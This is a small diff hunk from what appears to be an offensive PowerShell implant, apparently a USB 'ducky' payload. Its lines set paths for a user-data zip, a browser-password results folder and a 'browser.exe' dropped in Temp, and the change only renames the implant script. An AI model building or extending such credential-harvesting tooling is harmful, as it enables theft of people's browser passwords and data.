@@ -201,7 +201,7 @@ if ($PSScriptRoot -ne $duckletter) {
 
     $DataZipFile = "$currentScriptPath\$env:USERNAME.zip"
     $DataFile = "$currentScriptPath\$env:USERNAME"
-    $ThisScript = "$PSScriptRoot\implantti.ps1"
+    $ThisScript = "$PSScriptRoot\implantt1.ps1"
     $browserpass = "$env:LOCALAPPDATA\Temp\$env:USERNAME\results"
     $browserexe = "$env:LOCALAPPDATA\Temp\browser.exe"
 
